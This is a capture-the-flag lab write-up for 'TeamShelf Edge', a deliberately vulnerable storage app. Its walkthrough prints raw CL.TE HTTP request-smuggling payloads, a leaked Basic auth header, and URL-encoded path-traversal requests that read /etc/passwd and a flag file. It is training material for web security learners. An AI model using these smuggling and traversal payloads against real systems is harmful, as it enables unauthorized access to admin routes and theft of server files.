# TeamShelf Edge

**Description of the lab:**

TeamShelf Edge is a realistic cloud-storage challenge focused on HTTP request smuggling. Learners interact with a shared storage workspace, follow the upload-review business flow, reach a backend-only admin queue with CL.TE desync, recover an archived restore connector header, and abuse the archive reader to read `/home/local.txt`.

Lab details:

- **Difficulty:** Hard
- **Type:** AppSec
- **Theme:** Web
- **Topics:** HTTP request smuggling, CL.TE desync, upload validation, Burp Suite, parameter fuzzing, path traversal

---

## 1. Lab Context

TeamShelf is a team storage service used by ACME-Collab for contracts, onboarding notes, audit logs, and retention documents. The public workspace exposes normal storage actions such as browsing files, downloading shared objects, checking sync health, and submitting PDF retention documents for review.

The realistic weakness is in the production-style split between the public edge gateway and the backend object service. The edge blocks administrative routes from external users, but it keeps a warm HTTP/1.1 upstream connection to the object service. The edge frames requests with `Content-Length`, while the object service honors `Transfer-Encoding: chunked`. That parser mismatch creates a CL.TE desync, allowing one request to be hidden behind another and executed by the backend.

The story is not that `/admin` is found by blind directory fuzzing. The public upload workflow leaks why `/admin` exists: suspicious retention uploads are routed to an admin review queue. Once the queue is reached through smuggling, it shows an archive-history note from a restore migration. During that migration, a legacy Basic authorization header was archived with the restore notes and never rotated. That header unlocks `/admin/archive`, where the legacy archive reader accepts a `filename` query parameter and fails to contain path traversal. Reading `../../../home/local.txt` returns the mounted flag.

---

## 2. Lab Infrastructure

Single AWS Ubuntu 26 host running one Docker container.

- Public listener: TeamShelf Edge Gateway on `0.0.0.0:8080`.
- Internal listener: TeamShelf Object Service on `127.0.0.1:9001` inside the container only.
- Host flag mount: `/home/local.txt` mounted read-only to `/home/local.txt` in the container.

Only port `8080` is published to the host. The internal object service is not exposed through Docker or the AWS security group; it exists only to model the front-end/back-end parser mismatch needed for CL.TE request smuggling. The flag bind mount is required so the platform flag persists across rebuilds and reboots.

![TeamShelf infrastructure](images/image.png)

---

## 3. Attack Kill Chain

![TeamShelf attack kill chain](images/image-1.png)

| Phase | Story Beat | Evidence | Tooling |
|---|---|---|---|
| Recon | Browse the shared storage workspace and identify public routes. | `/`, `/download`, `/upload`, `/api/health` | Browser, Burp Proxy, ffuf |
| Business-flow clue | Submit a non-PDF to the retention intake form. | Rejection notice mentions `/admin?queue=upload-review` | Burp Repeater |
| Edge access control | Request `/admin` directly and confirm it is blocked externally. | HTTP 404 from `TeamShelf-Edge/4.18` | Burp Repeater |
| Desync | Send a CL.TE request and a trigger request over the same upstream flow. | Trigger receives backend admin response | Burp Repeater or raw HTTP tooling |
| Credential recovery | Read the smuggled upload-review queue. | Archived `Authorization: Basic ...` header and `GET /admin/archive` | Burp response body |
| Parameter discovery | Fuzz or test archive selector names. | `filename` changes behavior from `missing filename` to object lookup | ffuf, Intruder, Repeater |
| Collection | Use archive traversal to read host-mounted flag. | `/admin/archive?filename=../../../home/local.txt` | Smuggled archive request |

---

## 4. MITRE ATT&CK Mapping

| Tactic | ID | Technique | Where Observed | IOCs / Artifacts |
|---|---|---|---|---|
| Initial Access | T1190 | Exploit Public-Facing Application | CL.TE desync against TeamShelf Edge Gateway | `Content-Length` and `Transfer-Encoding: chunked` in one request |
| Collection | T1005 | Data from Local System | Backend archive reader opens `/home/local.txt` | `/admin/archive?filename=../../../home/local.txt` |

---

## 5. Lab Prerequisites

| Resource | Location / URL | Credentials / Notes |
|---|---|---|
| TeamShelf web app | `http://<instance-ip>:8080/` | No public credentials required |

---

## 6. Walkthrough Story

The first page looks like a normal internal storage dashboard. It shows recent objects, public download paths, and a document intake panel for retention PDFs. Nothing here gives admin credentials directly; it is meant to look like a working storage product rather than a puzzle page.

![TeamShelf homepage](images/03-teamshelf-homepage.png)

Basic content discovery only needs to find normal public routes. In validation, a local `common.txt` wordlist found `/upload`; the challenge does not ship a wordlist, so players bring their own SecLists or equivalent tooling.

![ffuf upload discovery](images/01-ffuf-upload-discovery.png)

The public download feature works for published workspace objects. This confirms that object paths such as `contracts/q2-renewals.txt` and `teams/engineering/onboarding.txt` are real application data and not static decoration.

![Valid public download in Burp](images/02-valid-download-burp.png)

Trying obvious traversal against the public download endpoint does not solve the challenge. The public route has its own allowlist and returns a generic missing-object response for paths like `../../../etc/passwd`.

![Public download traversal blocked](images/04-public-download-traversal-blocked.png)

The useful clue comes from the upload business flow. The intake accepts retention documents and claims to be PDF-only. Submitting a file with a `.pdf` name but invalid PDF content is rejected cleanly, and the JSON notice explains where suspicious files go:

```json
{
  "error": "upload rejected",
  "notice": "Suspicious files are routed to the Admin Review queue: /admin?queue=upload-review"
}
```

![Upload rejection points to admin review](images/05-upload-rejection-admin-review.png)

Directly browsing that admin URL does not work. The response comes from the edge tier, not the object service:

```http
GET /admin?queue=upload-review HTTP/1.1
Host: <host>:<port>
Connection: close
```

```text
HTTP/1.1 404 Not Found
Server: TeamShelf-Edge/4.18
```

![Direct admin blocked by edge](images/06-direct-admin-edge-404.png)

The reason to investigate request smuggling is visible when comparing the edge-blocked admin route with backend-served routes. The health endpoint is handled by the object service and exposes the operational clue that the edge talks to the backend over an HTTP/1.1 keep-alive upstream:

```json
{
  "backend": "obj-eu-archive-03",
  "edge": "cache-warm",
  "status": "ok",
  "upstream": "http/1.1 keep-alive"
}
```

The desync attempt uses a CL.TE shape. The edge trusts `Content-Length` and forwards the full body. The backend honors chunked framing, stops at the `0` chunk, and treats the bytes after it as the next HTTP request on the same upstream connection.

```http
POST /upload HTTP/1.1
Host: <host>:<port>
Content-Type: application/x-www-form-urlencoded
Content-Length: <computed-body-length>
Transfer-Encoding: chunked
Connection: keep-alive

0

GET /admin?queue=upload-review HTTP/1.1
Host: <host>:<port>
Connection: keep-alive

```

After the smuggle request, a normal trigger request is sent so the queued backend response can be read:

```http
GET /api/health HTTP/1.1
Host: <host>:<port>
Connection: close

```

During manual testing, sending the trigger by itself produces no useful response because nothing has been queued yet.

![Empty trigger before smuggling](images/07-burp-trigger-tab-empty.png)

The CL.TE body is sensitive to exact byte counts. A wrong `Content-Length`, wrong request ordering, or a connection that is not reused will only return the upload rejection instead of the hidden admin response.

![Wrong CL.TE attempt returns upload rejection](images/08-burp-smuggle-attempt-wrong-length.png)

Turbo Intruder or similar tooling can help maintain a single connection, but it still has to send the right bytes. A normal `/api/health` response only proves the backend exists; it is not proof that the admin request was smuggled.

![Turbo Intruder health response during testing](images/09-turbo-intruder-health-not-smuggled.png)

With the CL.TE request corrected, the trigger response contains the backend-only upload review queue. The queue explains why credentials are present there: the restore-runner archived a connector note with the legacy header still attached.

![Smuggled admin queue leaks archived header](images/10-smuggled-admin-header-leak.png)

The same response also names the restore console route:

```html
<h1>Upload Review Queue</h1>
<code>Authorization: Basic c3ZjLWF1ZGl0OmxlZGdlci1kcmlmdC0yMDI2</code>
<code>GET /admin/archive</code>
```

![Smuggling proof with admin response](images/11-smuggling-proof-admin-response.png)

The cleaner validation flow is to smuggle `/admin` first, then smuggle `/admin?queue=upload-review`. A bare `/admin` confirms the backend admin app exists but expects a queue name. Adding `queue=upload-review` returns the real queue page and the archived connector header.

![Smuggler admin and queue validation](images/13-smuggler-admin-and-queue.png)

The archive route is now the target. Without the leaked Basic header, the restore endpoint is not usable. With the header but without the right selector parameter, the backend returns `missing filename`. This makes parameter discovery meaningful: the route is known, the credential is known, but the object selector name is still unknown.

Common names such as `file`, `path`, `object`, `key`, `id`, and `filename` can be tested manually or fuzzed. The lab does not provide a wordlist; players can use their own SecLists and wrap each candidate inside the same smuggled request pattern.

The important behavior change is:

```http
GET /admin/archive?id=test.txt HTTP/1.1
Host: <host>:<port>
Authorization: Basic c3ZjLWF1ZGl0OmxlZGdlci1kcmlmdC0yMDI2
Connection: keep-alive
```

```json
{
  "error": "missing filename"
}
```

Then:

```http
GET /admin/archive?filename=test.txt HTTP/1.1
Host: <host>:<port>
Authorization: Basic c3ZjLWF1ZGl0OmxlZGdlci1kcmlmdC0yMDI2
Connection: keep-alive
```

```json
{
  "error": "archive object not found",
  "filename": "test.txt"
}
```

That confirms the parameter name is `filename`.

![Archive parameter discovery](images/14-smuggler-archive-param-discovery.png)

Before going straight for the flag, it is natural in a CTF to test `../../../etc/passwd`. Direct public download traversal was blocked earlier, but this is a different backend-only archive reader. The encoded traversal works when smuggled through `/admin/archive` with the leaked Basic header:

```http
GET /admin/archive?filename=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
Host: <host>:<port>
Authorization: Basic c3ZjLWF1ZGl0OmxlZGdlci1kcmlmdC0yMDI2
Connection: keep-alive
```

```text
root:x:0:0:root:/root:/usr/sbin/nologin
nobody:x:65532:65532:TeamShelf runtime user:/nonexistent:/usr/sbin/nologin
teamshelf:x:1000:1000:TeamShelf service account:/srv/teamshelf:/usr/sbin/nologin
```

One early validation screenshot shows the same idea failing through the public route, which is expected and useful evidence that the exploit must go through the backend archive reader rather than `/download`.

![Traversal attempt blocked outside archive reader](images/12-traversal-etc-passwd-not-found.png)

The successful backend archive traversal confirms file read impact.

![Successful passwd traversal](images/15-smuggler-etc-passwd.png)

The final request changes only the target path. The flag is mounted at `/home/local.txt`, so the archive filename becomes `../../../home/local.txt`, URL-encoded in the request:

```http
GET /admin/archive?filename=..%2F..%2F..%2Fhome%2Flocal.txt HTTP/1.1
Host: <host>:<port>
Authorization: Basic c3ZjLWF1ZGl0OmxlZGdlci1kcmlmdC0yMDI2
Connection: keep-alive
```

```text
SECdojo{...}
```

![Final flag read](images/16-smuggler-final-flag.png)

The final answer is the content of `/home/local.txt` for the deployed instance.
